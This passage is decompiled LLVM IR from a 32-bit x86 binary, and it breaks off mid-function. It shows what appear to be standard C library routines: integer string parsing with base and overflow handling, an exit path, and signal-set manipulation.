dec_label_pc_8053c2d:                             ; preds = %dec_label_pc_8053c14, %dec_label_pc_8053c2d
  %v0_8053c2d = phi i32 [ %v1_8053c2d, %dec_label_pc_8053c2d ], [ %v4_8053c21, %dec_label_pc_8053c14 ]
  %v1_8053c2d = add i32 %v0_8053c2d, 1
  store i32 %v1_8053c2d, i32* %ebx.global-to-local, align 4
  %v1_8053c2e = inttoptr i32 %v1_8053c2d to i8*
  %v2_8053c2e = load i8, i8* %v1_8053c2e, align 1
  %v3_8053c2e = sext i8 %v2_8053c2e to i32
  store i32 %v3_8053c2e, i32* %eax.global-to-local, align 4
  %v2_8053c31 = mul nsw i32 %v3_8053c2e, 2
  %v3_8053c31 = add i32 %v2_8053c31, %v0_8053c1b
  %v4_8053c31 = inttoptr i32 %v3_8053c31 to i8*
  %v5_8053c31 = load i8, i8* %v4_8053c31, align 1
  %v6_8053c31 = and i8 %v5_8053c31, 32
  %v7_8053c31 = icmp eq i8 %v6_8053c31, 0
  %v1_8053c35 = icmp eq i1 %v7_8053c31, false
  br i1 %v1_8053c35, label %dec_label_pc_8053c2d, label %dec_label_pc_8053c37

dec_label_pc_8053c37:                             ; preds = %dec_label_pc_8053c2d, %dec_label_pc_8053c14
  %v0_8053c4c = phi i32 [ %v4_8053c21, %dec_label_pc_8053c14 ], [ %v1_8053c2d, %dec_label_pc_8053c2d ]
  %v4_8053c65 = phi i32 [ %v3_8053c2e9, %dec_label_pc_8053c14 ], [ %v3_8053c2e, %dec_label_pc_8053c2d ]
  %v9_8053c37 = icmp eq i32 %v4_8053c65, 43
  br i1 %v9_8053c37, label %dec_label_pc_8053c4c, label %dec_label_pc_8053c3c

dec_label_pc_8053c3c:                             ; preds = %dec_label_pc_8053c37
  store i32 0, i32* %ebp.global-to-local, align 4
  %v9_8053c3e = icmp eq i32 %v4_8053c65, 45
  %v1_8053c41 = icmp eq i1 %v9_8053c3e, false
  br i1 %v1_8053c41, label %dec_label_pc_8053c4d, label %dec_label_pc_8053c4c

dec_label_pc_8053c4c:                             ; preds = %dec_label_pc_8053c37, %dec_label_pc_8053c3c
  %storemerge3 = phi i32 [ 1, %dec_label_pc_8053c3c ], [ 0, %dec_label_pc_8053c37 ]
  store i32 %storemerge3, i32* %ebp.global-to-local, align 4
  %v1_8053c4c = add i32 %v0_8053c4c, 1
  store i32 %v1_8053c4c, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c4d

dec_label_pc_8053c4d:                             ; preds = %dec_label_pc_8053c3c, %dec_label_pc_8053c4c
  %v0_8053c5f = phi i32 [ %v0_8053c4c, %dec_label_pc_8053c3c ], [ %v1_8053c4c, %dec_label_pc_8053c4c ]
  %v1_8053c4f = and i32 %arg3, -17
  %v2_8053c4f = icmp eq i32 %v1_8053c4f, 0
  %v1_8053c55 = icmp eq i1 %v2_8053c4f, false
  br i1 %v1_8053c55, label %dec_label_pc_8053c7b, label %dec_label_pc_8053c57

dec_label_pc_8053c57:                             ; preds = %dec_label_pc_8053c4d
  %v1_8053c57 = add i32 %arg3, 10
  store i32 %v1_8053c57, i32* %esi.global-to-local, align 4
  %v1_8053c5a = inttoptr i32 %v0_8053c5f to i8*
  %v2_8053c5a = load i8, i8* %v1_8053c5a, align 1
  %v8_8053c5a = icmp eq i8 %v2_8053c5a, 48
  %v1_8053c5d = icmp eq i1 %v8_8053c5a, false
  br i1 %v1_8053c5d, label %dec_label_pc_8053c71, label %dec_label_pc_8053c5f

dec_label_pc_8053c5f:                             ; preds = %dec_label_pc_8053c57
  %v1_8053c5f = add i32 %v0_8053c5f, 1
  store i32 %v1_8053c5f, i32* %ebx.global-to-local, align 4
  %v1_8053c60 = add i32 %arg3, 8
  store i32 %v1_8053c60, i32* %esi.global-to-local, align 4
  %v1_8053c65 = inttoptr i32 %v1_8053c5f to i8*
  %v2_8053c65 = load i8, i8* %v1_8053c65, align 1
  %v3_8053c65 = zext i8 %v2_8053c65 to i32
  %v5_8053c65 = and i32 %v4_8053c65, -256
  %v6_8053c65 = or i32 %v5_8053c65, %v3_8053c65
  %v1_8053c67 = or i32 %v6_8053c65, 32
  %v3_8053c67 = trunc i32 %v1_8053c67 to i8
  store i32 %v1_8053c67, i32* %eax.global-to-local, align 4
  %v10_8053c6a = icmp eq i8 %v3_8053c67, 120
  %v1_8053c6c = icmp eq i1 %v10_8053c6a, false
  br i1 %v1_8053c6c, label %dec_label_pc_8053c71, label %dec_label_pc_8053c6e

dec_label_pc_8053c6e:                             ; preds = %dec_label_pc_8053c5f
  %v2_8053c6e = mul i32 %v1_8053c60, 2
  store i32 %v2_8053c6e, i32* %esi.global-to-local, align 4
  %v1_8053c70 = add i32 %v0_8053c5f, 2
  store i32 %v1_8053c70, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8053c71

dec_label_pc_8053c71:                             ; preds = %dec_label_pc_8053c5f, %dec_label_pc_8053c57, %dec_label_pc_8053c6e
  %v0_8053c9a26 = phi i32 [ %v1_8053c5f, %dec_label_pc_8053c5f ], [ %v0_8053c5f, %dec_label_pc_8053c57 ], [ %v1_8053c70, %dec_label_pc_8053c6e ]
  %v0_8053cf134 = phi i32 [ %v1_8053c5f, %dec_label_pc_8053c5f ], [ %v4_8053c21, %dec_label_pc_8053c57 ], [ %v1_8053c5f, %dec_label_pc_8053c6e ]
  %v0_8053c71 = phi i32 [ %v1_8053c60, %dec_label_pc_8053c5f ], [ %v1_8053c57, %dec_label_pc_8053c57 ], [ %v2_8053c6e, %dec_label_pc_8053c6e ]
  %v7_8053c74 = icmp sgt i32 %v0_8053c71, 16
  br i1 %v7_8053c74, label %dec_label_pc_8053c7b.thread, label %dec_label_pc_8053c7b

dec_label_pc_8053c7b.thread:                      ; preds = %dec_label_pc_8053c71
  store i32 16, i32* %esi.global-to-local, align 4
  store i32 14, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c85

dec_label_pc_8053c7b:                             ; preds = %dec_label_pc_8053c71, %dec_label_pc_8053c4d
  %v0_8053cf135 = phi i32 [ %v0_8053cf134, %dec_label_pc_8053c71 ], [ %v4_8053c21, %dec_label_pc_8053c4d ]
  %v0_8053c9a27 = phi i32 [ %v0_8053c9a26, %dec_label_pc_8053c71 ], [ %v0_8053c5f, %dec_label_pc_8053c4d ]
  %v0_8053c8a = phi i32 [ %v0_8053c71, %dec_label_pc_8053c71 ], [ %arg3, %dec_label_pc_8053c4d ]
  %v1_8053c7b = add i32 %v0_8053c8a, -2
  store i32 %v1_8053c7b, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v6_8053c83 = icmp ugt i32 %v1_8053c7b, 34
  br i1 %v6_8053c83, label %dec_label_pc_8053ce6, label %dec_label_pc_8053c85

dec_label_pc_8053c85:                             ; preds = %dec_label_pc_8053c7b.thread, %dec_label_pc_8053c7b
  %v0_8053c8a59 = phi i32 [ 16, %dec_label_pc_8053c7b.thread ], [ %v0_8053c8a, %dec_label_pc_8053c7b ]
  %v0_8053c9a2758 = phi i32 [ %v0_8053c9a26, %dec_label_pc_8053c7b.thread ], [ %v0_8053c9a27, %dec_label_pc_8053c7b ]
  %v0_8053cf13557 = phi i32 [ %v0_8053cf134, %dec_label_pc_8053c7b.thread ], [ %v0_8053cf135, %dec_label_pc_8053c7b ]
  %div = udiv i32 -1, %v0_8053c8a59
  store i32 %div, i32* %eax.global-to-local, align 4
  %tmp52 = urem i32 -1, %v0_8053c8a59
  %v1_8053c8c = trunc i32 %tmp52 to i8
  store i32 0, i32* %edx.global-to-local, align 4
  %v4_8053cc6 = urem i32 %arg4, 256
  br label %dec_label_pc_8053c9a

dec_label_pc_8053c98:                             ; preds = %dec_label_pc_8053cdc, %dec_label_pc_8053cc6
  %v4_8053c9a.pre = phi i32 [ %v1_8053cb0, %dec_label_pc_8053cdc ], [ %v4_8053c9a.pre.pre, %dec_label_pc_8053cc6 ]
  %v0_8053c98 = phi i32 [ %v1_8053cb7, %dec_label_pc_8053cdc ], [ %v0_8053c98.pre, %dec_label_pc_8053cc6 ]
  br label %dec_label_pc_8053c9a

dec_label_pc_8053c9a:                             ; preds = %dec_label_pc_8053c85, %dec_label_pc_8053c98
  %v0_8053cf133 = phi i32 [ %v0_8053cf13557, %dec_label_pc_8053c85 ], [ %v0_8053c98, %dec_label_pc_8053c98 ]
  %v0_8053cb7 = phi i32 [ %v0_8053c9a2758, %dec_label_pc_8053c85 ], [ %v0_8053c98, %dec_label_pc_8053c98 ]
  %v4_8053c9a = phi i32 [ %div, %dec_label_pc_8053c85 ], [ %v4_8053c9a.pre, %dec_label_pc_8053c98 ]
  %v1_8053c9a = inttoptr i32 %v0_8053cb7 to i8*
  %v2_8053c9a = load i8, i8* %v1_8053c9a, align 1
  %v3_8053c9a = zext i8 %v2_8053c9a to i32
  %v5_8053c9a = and i32 %v4_8053c9a, -256
  %v6_8053c9a = or i32 %v3_8053c9a, %v5_8053c9a
  store i32 %v6_8053c9a, i32* %eax.global-to-local, align 4
  %v1_8053c9c = add i32 %v6_8053c9a, -48
  %v1_8053c9f = trunc i32 %v1_8053c9c to i8
  %tmp60 = icmp ult i8 %v1_8053c9f, 10
  br i1 %tmp60, label %dec_label_pc_8053cb0, label %dec_label_pc_8053ca4

dec_label_pc_8053ca4:                             ; preds = %dec_label_pc_8053c9a
  %v1_8053ca4 = or i32 %v6_8053c9a, 32
  %v3_8053ca4 = trunc i32 %v1_8053ca4 to i8
  store i32 %v1_8053ca4, i32* %eax.global-to-local, align 4
  %v1_8053ca7 = and i32 %v1_8053c9c, -256
  %v2_8053ca7 = or i32 %v1_8053ca7, 40
  %tmp61 = icmp ult i8 %v3_8053ca4, 97
  br i1 %tmp61, label %dec_label_pc_8053cb0, label %dec_label_pc_8053cad

dec_label_pc_8053cad:                             ; preds = %dec_label_pc_8053ca4
  %v1_8053cad = add i32 %v1_8053ca4, -87
  br label %dec_label_pc_8053cb0

dec_label_pc_8053cb0:                             ; preds = %dec_label_pc_8053ca4, %dec_label_pc_8053c9a, %dec_label_pc_8053cad
  %v0_8053cdf = phi i32 [ %v2_8053ca7, %dec_label_pc_8053ca4 ], [ %v1_8053c9c, %dec_label_pc_8053c9a ], [ %v1_8053cad, %dec_label_pc_8053cad ]
  %v1_8053cb0 = urem i32 %v0_8053cdf, 256
  store i32 %v1_8053cb0, i32* %eax.global-to-local, align 4
  %v1_8053cb3 = load i32, i32* %esi.global-to-local, align 4
  %v2_8053cb3 = sub i32 %v1_8053cb0, %v1_8053cb3
  %v10_8053cb3 = and i32 %v2_8053cb3, %v1_8053cb3
  %v11_8053cb3 = icmp slt i32 %v10_8053cb3, 0
  %v13_8053cb3 = icmp slt i32 %v2_8053cb3, 0
  %v2_8053cb5 = icmp eq i1 %v13_8053cb3, %v11_8053cb3
  br i1 %v2_8053cb5, label %dec_label_pc_8053ce6, label %dec_label_pc_8053cb7

dec_label_pc_8053cb7:                             ; preds = %dec_label_pc_8053cb0
  %v1_8053cb7 = add i32 %v0_8053cb7, 1
  store i32 %v1_8053cb7, i32* %ebx.global-to-local, align 4
  %v0_8053cb8 = load i32, i32* %edx.global-to-local, align 4
  %tmp62 = icmp ugt i32 %v0_8053cb8, %div
  br i1 %tmp62, label %dec_label_pc_8053cc6, label %dec_label_pc_8053cbe

dec_label_pc_8053cbe:                             ; preds = %dec_label_pc_8053cb7
  %v15_8053cb8 = icmp eq i32 %v0_8053cb8, %div
  %v1_8053cbe = icmp eq i1 %v15_8053cb8, false
  br i1 %v1_8053cbe, label %dec_label_pc_8053cdc, label %dec_label_pc_8053cc0

dec_label_pc_8053cc0:                             ; preds = %dec_label_pc_8053cbe
  %v1_8053cc0 = trunc i32 %v0_8053cdf to i8
  %tmp63 = icmp ugt i8 %v1_8053cc0, %v1_8053c8c
  br i1 %tmp63, label %dec_label_pc_8053cc6, label %dec_label_pc_8053cdc

dec_label_pc_8053cc6:                             ; preds = %dec_label_pc_8053cc0, %dec_label_pc_8053cb7
  store i32 %v4_8053cc6, i32* %eax.global-to-local, align 4
  %v0_8053cca = load i32, i32* %ebp.global-to-local, align 4
  %v2_8053cca = and i32 %v0_8053cca, %v4_8053cc6
  store i32 %v2_8053cca, i32* %ebp.global-to-local, align 4
  %v1_8053ccc = call i32 @function_8052719(i32 %div)
  store i32 %v1_8053ccc, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %edx.global-to-local, align 4
  %v1_8053cd4 = inttoptr i32 %v1_8053ccc to i32*
  store i32 34, i32* %v1_8053cd4, align 4
  %v0_8053c98.pre = load i32, i32* %ebx.global-to-local, align 4
  %v4_8053c9a.pre.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c98

dec_label_pc_8053cdc:                             ; preds = %dec_label_pc_8053cc0, %dec_label_pc_8053cbe
  %v4_8053cdc = mul i32 %v0_8053cb8, %v1_8053cb3
  store i32 %v1_8053cb0, i32* %eax.global-to-local, align 4
  %v2_8053ce2 = add i32 %v4_8053cdc, %v1_8053cb0
  store i32 %v2_8053ce2, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053c98

dec_label_pc_8053ce6:                             ; preds = %dec_label_pc_8053cb0, %dec_label_pc_8053c7b
  %v0_8053cf1 = phi i32 [ %v0_8053cf135, %dec_label_pc_8053c7b ], [ %v0_8053cf133, %dec_label_pc_8053cb0 ]
  %stack_var_-24.0 = phi i32 [ %tmp42, %dec_label_pc_8053c7b ], [ %div, %dec_label_pc_8053cb0 ]
  %v4_8053ce6 = icmp eq i32 %arg2, 0
  br i1 %v4_8053ce6, label %dec_label_pc_8053cf3, label %dec_label_pc_8053ced

dec_label_pc_8053ced:                             ; preds = %dec_label_pc_8053ce6
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_8053cf1 = inttoptr i32 %arg2 to i32*
  store i32 %v0_8053cf1, i32* %v2_8053cf1, align 4
  br label %dec_label_pc_8053cf3

dec_label_pc_8053cf3:                             ; preds = %dec_label_pc_8053ce6, %dec_label_pc_8053ced
  %v0_8053cf3 = load i32, i32* %ebp.global-to-local, align 4
  store i32 %v0_8053cf3, i32* %eax.global-to-local, align 4
  %v1_8053cf5 = trunc i32 %v0_8053cf3 to i8
  %v6_8053cf5 = icmp eq i8 %v1_8053cf5, 0
  %v2_8053cf7 = zext i1 %v6_8053cf5 to i32
  %v1_8053cf94 = or i32 %v2_8053cf7, -2147483648
  store i32 %v1_8053cf94, i32* %ebx.global-to-local, align 4
  %v5_8053cff = icmp eq i8 %tmp, 0
  br i1 %v5_8053cff, label %dec_label_pc_8053d17, label %dec_label_pc_8053d06

dec_label_pc_8053d06:                             ; preds = %dec_label_pc_8053cf3
  %v0_8053d06 = load i32, i32* %edx.global-to-local, align 4
  %tmp64 = icmp ugt i32 %v0_8053d06, %v1_8053cf94
  br i1 %tmp64, label %dec_label_pc_8053d0a, label %dec_label_pc_8053d17

dec_label_pc_8053d0a:                             ; preds = %dec_label_pc_8053d06
  %v1_8053d0a = call i32 @function_8052719(i32 %stack_var_-24.0)
  store i32 %v1_8053d0a, i32* %eax.global-to-local, align 4
  %v0_8053d0f = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8053d0f, i32* %edx.global-to-local, align 4
  %v1_8053d11 = inttoptr i32 %v1_8053d0a to i32*
  store i32 34, i32* %v1_8053d11, align 4
  %v0_8053d17.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8053d17

dec_label_pc_8053d17:                             ; preds = %dec_label_pc_8053d06, %dec_label_pc_8053cf3, %dec_label_pc_8053d0a
  %v0_8053d17 = phi i32 [ %v0_8053cf3, %dec_label_pc_8053d06 ], [ %v0_8053cf3, %dec_label_pc_8053cf3 ], [ %v0_8053d17.pre, %dec_label_pc_8053d0a ]
  store i32 %v0_8053d17, i32* %eax.global-to-local, align 4
  %v3_8053d19 = trunc i32 %v0_8053d17 to i8
  %v4_8053d19 = icmp eq i8 %v3_8053d19, 0
  %v0_8053d22.pre = load i32, i32* %edx.global-to-local, align 4
  br i1 %v4_8053d19, label %dec_label_pc_8053d1f, label %dec_label_pc_8053d1d

dec_label_pc_8053d1d:                             ; preds = %dec_label_pc_8053d17
  %v1_8053d1d = sub i32 0, %v0_8053d22.pre
  store i32 %v1_8053d1d, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8053d1f

dec_label_pc_8053d1f:                             ; preds = %dec_label_pc_8053d17, %dec_label_pc_8053d1d
  %v0_8053d22 = phi i32 [ %v1_8053d1d, %dec_label_pc_8053d1d ], [ %v0_8053d22.pre, %dec_label_pc_8053d17 ]
  store i32 %v0_8053d22, i32* %eax.global-to-local, align 4
  %v2_8053d24 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8053d24, i32* @ebx, align 4
  ret i32 %v0_8053d22

; uselistorder directives
  uselistorder i32 %v0_8053d22, { 1, 0 }
  uselistorder i32 %v0_8053d17, { 1, 0 }
  uselistorder i32 %v0_8053cb8, { 0, 2, 1 }
  uselistorder i32 %v1_8053cb7, { 1, 0 }
  uselistorder i32 %v2_8053cb3, { 1, 0 }
  uselistorder i32 %v1_8053cb0, { 4, 2, 1, 0, 3 }
  uselistorder i32 %v0_8053cdf, { 1, 0 }
  uselistorder i32 %v0_8053c98, { 1, 0 }
  uselistorder i32 %v4_8053cc6, { 1, 0 }
  uselistorder i32 %div, { 0, 4, 2, 1, 3, 5 }
  uselistorder i32 %v0_8053c8a59, { 1, 0 }
  uselistorder i32 %v0_8053cf135, { 1, 0 }
  uselistorder i32 %v2_8053c6e, { 1, 0 }
  uselistorder i32 %v1_8053c67, { 1, 0 }
  uselistorder i32 %v1_8053c60, { 1, 0, 2 }
  uselistorder i32 %v0_8053c5f, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_8053c65, { 2, 0, 1 }
  uselistorder i32 %v1_8053c2d, { 0, 3, 2, 1 }
  uselistorder i32 %v4_8053c21, { 3, 2, 1, 0, 4 }
  uselistorder i32* %esi.global-to-local, { 4, 1, 0, 2, 3, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 7, 1, 6, 2, 3, 4, 5, 8, 10, 9 }
  uselistorder i32* %ebp.global-to-local, { 4, 2, 0, 3, 5, 1 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 6, 9, 10, 7, 8, 11, 12, 13, 14, 17, 15, 16, 0 }
  uselistorder i8 10, { 0, 1, 2, 3, 6, 5, 4, 7, 12, 9, 10, 13, 11, 8 }
  uselistorder i8 48, { 0, 2, 1 }
  uselistorder i32 -17, { 1, 0 }
  uselistorder i8 32, { 17, 16, 1, 2, 3, 4, 5, 6, 7, 8, 11, 12, 9, 13, 14, 15, 0, 10 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8053d1f, { 1, 0 }
  uselistorder label %dec_label_pc_8053d17, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053cf3, { 1, 0 }
  uselistorder label %dec_label_pc_8053cb0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053c9a, { 1, 0 }
  uselistorder label %dec_label_pc_8053c85, { 1, 0 }
  uselistorder label %dec_label_pc_8053c71, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8053c4d, { 1, 0 }
  uselistorder label %dec_label_pc_8053c4c, { 1, 0 }
  uselistorder label %dec_label_pc_8053c2d, { 1, 0 }
}

define i32 @function_8053d29(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053d29:
  %stack_var_-24 = alloca i32, align 4
  store i32 %arg1, i32* @esi, align 4
  %v2_8053d3c = ptrtoint i32* %stack_var_-24 to i32
  store i32 %v2_8053d3c, i32* @ebx, align 4
  %v2_8053d41 = call i32 @function_80540a0(i32 %v2_8053d3c, i32 134561949)
  %v1_8053d4d = call i32 @function_805409d(i32 ptrtoint (i32* @global_var_8056830.231 to i32))
  %v0_8053d52 = load i32, i32* @global_var_8056918.232, align 8
  store i32 %v0_8053d52, i32* @eax, align 4
  %v1_8053d5a = icmp eq i32 %v0_8053d52, 0
  br i1 %v1_8053d5a, label %dec_label_pc_8053d67, label %dec_label_pc_8053d5e

dec_label_pc_8053d5e:                             ; preds = %dec_label_pc_8053d29
  %v0_8053d61 = load i32, i32* @esi, align 4
  %v1_8053d62 = call i32 @unknown_0(i32 %v0_8053d61)
  store i32 %v1_8053d62, i32* @eax, align 4
  br label %dec_label_pc_8053d67

dec_label_pc_8053d67:                             ; preds = %dec_label_pc_8053d29, %dec_label_pc_8053d5e
  %v2_8053d6c = call i32 @function_80540a0(i32 %v2_8053d3c, i32 1)
  %v0_8053d71 = call i32 @function_805405e()
  %v0_8053d8a = load i32, i32* @esi, align 4
  %v1_8053d8b = call i32 @function_8054440(i32 %v0_8053d8a)
  unreachable

; uselistorder directives
  uselistorder i32 (i32)* @function_8054440, { 1, 0 }
  uselistorder i32 (i32)* @function_805409d, { 7, 6, 5, 4, 3, 10, 0, 1, 9, 8, 2 }
  uselistorder i32 (i32, i32)* @function_80540a0, { 8, 7, 6, 5, 13, 12, 4, 0, 3, 1, 11, 10, 9, 2 }
  uselistorder label %dec_label_pc_8053d67, { 1, 0 }
}

define i32 @function_8053d90(i32 %arg1) local_unnamed_addr {
dec_label_pc_8053d90:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-420 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-460 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-444 = alloca i32, align 4
  %v0_8053d90 = load i32, i32* @ebp, align 4
  %v0_8053d91 = load i32, i32* @edi, align 4
  %v0_8053d92 = load i32, i32* @esi, align 4
  %v0_8053d93 = load i32, i32* @ebx, align 4
  store i32 32, i32* %eax.global-to-local, align 4
  store i32 %arg1, i32* @edx, align 4
  %v1_8053da6 = icmp eq i32 %arg1, 0
  %v1_8053da8 = icmp eq i1 %v1_8053da6, false
  br i1 %v1_8053da8, label %dec_label_pc_8053daf.lr.ph, label %dec_label_pc_8053f07

dec_label_pc_8053daf.lr.ph:                       ; preds = %dec_label_pc_8053d90
  %v15_8053d94 = ptrtoint i32* %stack_var_-444 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  %v4_8053daf56 = add i32 %v15_8053d94, 416
  %v5_8053daf57 = inttoptr i32 %v4_8053daf56 to i32*
  store i32 0, i32* %v5_8053daf57, align 4
  %v0_8053dba58 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053dba59 = add i32 %v0_8053dba58, -1
  %v9_8053dba60 = icmp slt i32 %v1_8053dba59, 0
  store i32 %v1_8053dba59, i32* %eax.global-to-local, align 4
  %v1_8053dbb61 = icmp eq i1 %v9_8053dba60, false
  br i1 %v1_8053dbb61, label %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge, label %dec_label_pc_8053dbd

dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge: ; preds = %dec_label_pc_8053daf.lr.ph, %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge
  %v1_8053dba62 = phi i32 [ %v1_8053dba, %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge ], [ %v1_8053dba59, %dec_label_pc_8053daf.lr.ph ]
  %v0_8053daf.pre = load i32, i32* @esp, align 4
  %v2_8053daf = mul i32 %v1_8053dba62, 4
  %v3_8053daf = add i32 %v0_8053daf.pre, 292
  %v4_8053daf = add i32 %v3_8053daf, %v2_8053daf
  %v5_8053daf = inttoptr i32 %v4_8053daf to i32*
  store i32 0, i32* %v5_8053daf, align 4
  %v0_8053dba = load i32, i32* %eax.global-to-local, align 4
  %v1_8053dba = add i32 %v0_8053dba, -1
  %v9_8053dba = icmp slt i32 %v1_8053dba, 0
  store i32 %v1_8053dba, i32* %eax.global-to-local, align 4
  %v1_8053dbb = icmp eq i1 %v9_8053dba, false
  br i1 %v1_8053dbb, label %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge, label %dec_label_pc_8053dbd

dec_label_pc_8053dbd:                             ; preds = %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge, %dec_label_pc_8053daf.lr.ph
  %v1_8053dba.lcssa = phi i32 [ %v1_8053dba59, %dec_label_pc_8053daf.lr.ph ], [ %v1_8053dba, %dec_label_pc_8053daf.dec_label_pc_8053daf_crit_edge ]
  store i32 %arg1, i32* %stack_var_-24, align 4
  %v2_8053dd3 = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_8053dd3, i32* @ebx, align 4
  store i32 %v2_8053dd3, i32* %stack_var_-460, align 4
  %v4_8053ddb = call i32 @function_8052b2e(i32 %v2_8053dd3, i32 17, i32 %v1_8053dba.lcssa, i32 %v1_8053dba.lcssa)
  store i32 %v4_8053ddb, i32* %eax.global-to-local, align 4
  %v2_8053de3 = icmp slt i32 %v4_8053ddb, 0
  br i1 %v2_8053de3, label %dec_label_pc_8053f0b, label %dec_label_pc_8053deb

dec_label_pc_8053deb:                             ; preds = %dec_label_pc_8053dbd
  %v2_8053dec = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_8053dec, i32* @esi, align 4
  store i32 0, i32* %stack_var_-460, align 4
  %v3_8053df7 = bitcast i32* %stack_var_-152 to %_TYPEDEF_sigset_t*
  %v4_8053df7 = call i32 @function_805244d(i32 0, %_TYPEDEF_sigset_t* %v3_8053df7, i32 %v2_8053dec)
  store i32 %v4_8053df7, i32* %eax.global-to-local, align 4
  %v1_8053dff = icmp eq i32 %v4_8053df7, 0
  %v1_8053e01 = icmp eq i1 %v1_8053dff, false
  br i1 %v1_8053e01, label %dec_label_pc_8053f0b, label %dec_label_pc_8053e07

dec_label_pc_8053e07:                             ; preds = %dec_label_pc_8053deb
  store i32 %v2_8053dec, i32* %stack_var_-460, align 4
  %v4_8053e0c = call i32 @function_8052b0a(i32 %v2_8053dec, i32 17, i32 %v4_8053df7, i32 %v4_8053df7)
  store i32 %v4_8053e0c, i32* %eax.global-to-local, align 4
  store i32 32, i32* %edx.global-to-local, align 4
  %v1_8053e19 = icmp eq i32 %v4_8053e0c, 0
  br i1 %v1_8053e19, label %dec_label_pc_8053e22.lr.ph, label %dec_label_pc_8053ed5

dec_label_pc_8053e22.lr.ph:                       ; preds = %dec_label_pc_8053e07
  store i32 31, i32* %edx.global-to-local, align 4
  store i32 0, i32* %v5_8053daf57, align 4
  %v0_8053e2d50 = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e2d51 = add i32 %v0_8053e2d50, -1
  %v9_8053e2d52 = icmp slt i32 %v1_8053e2d51, 0
  store i32 %v1_8053e2d51, i32* %edx.global-to-local, align 4
  %v1_8053e2e53 = icmp eq i1 %v9_8053e2d52, false
  br i1 %v1_8053e2e53, label %dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge, label %dec_label_pc_8053e30

dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge: ; preds = %dec_label_pc_8053e22.lr.ph, %dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge
  %v1_8053e2d54 = phi i32 [ %v1_8053e2d, %dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge ], [ %v1_8053e2d51, %dec_label_pc_8053e22.lr.ph ]
  %v0_8053e22.pre = load i32, i32* @esp, align 4
  %v2_8053e22 = mul i32 %v1_8053e2d54, 4
  %v3_8053e22 = add i32 %v0_8053e22.pre, 292
  %v4_8053e22 = add i32 %v3_8053e22, %v2_8053e22
  %v5_8053e22 = inttoptr i32 %v4_8053e22 to i32*
  store i32 0, i32* %v5_8053e22, align 4
  %v0_8053e2d = load i32, i32* %edx.global-to-local, align 4
  %v1_8053e2d = add i32 %v0_8053e2d, -1
  %v9_8053e2d = icmp slt i32 %v1_8053e2d, 0
  store i32 %v1_8053e2d, i32* %edx.global-to-local, align 4
  %v1_8053e2e = icmp eq i1 %v9_8053e2d, false
  br i1 %v1_8053e2e, label %dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge, label %dec_label_pc_8053e30

dec_label_pc_8053e30:                             ; preds = %dec_label_pc_8053e22.dec_label_pc_8053e22_crit_edge, %dec_label_pc_8053e22.lr.ph
  store i32 %v2_8053dd3, i32* %eax.global-to-local, align 4
  store i32 %v2_8053dd3, i32* %stack_var_-460, align 4
  %v4_8053e3c = call i32 @function_8052b2e(i32 %v2_8053dd3, i32 17, i32 0, i32 0)
  store i32 %v4_8053e3c, i32* %eax.global-to-local, align 4
  %v2_8053e44 = icmp slt i32 %v4_8053e3c, 0
  br i1 %v2_8053e44, label %dec_label_pc_8053f0b, label %dec_label_pc_8053e4c

dec_label_pc_8053e4c:                             ; preds = %dec_label_pc_8053e30
  %v2_8053e4d = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_8053e4d, i32* %eax.global-to-local, align 4
  store i32 17, i32* %stack_var_-460, align 4
  %v4_8053e56 = call i32 @function_80542df(i32 17, i32* null, i32 %v2_8053e4d)
  store i32 %v4_8053e56, i32* %eax.global-to-local, align 4
  %v2_8053e5e = icmp slt i32 %v4_8053e56, 0
  %v1_8053e60 = icmp eq i1 %v2_8053e5e, false
  br i1 %v1_8053e60, label %dec_label_pc_8053e8a, label %dec_label_pc_8053e62

dec_label_pc_8053e62:                             ; preds = %dec_label_pc_8053e4c
  %v0_8053e62 = load i32, i32* %stack_var_-460, align 4
  %v1_8053e62 = call i32 @function_8052719(i32 %v0_8053e62)
  store i32 %v1_8053e62, i32* %eax.global-to-local, align 4
  store i32 %v1_8053e62, i32* @ebx, align 4
  %v1_8053e69 = inttoptr i32 %v1_8053e62 to i32*
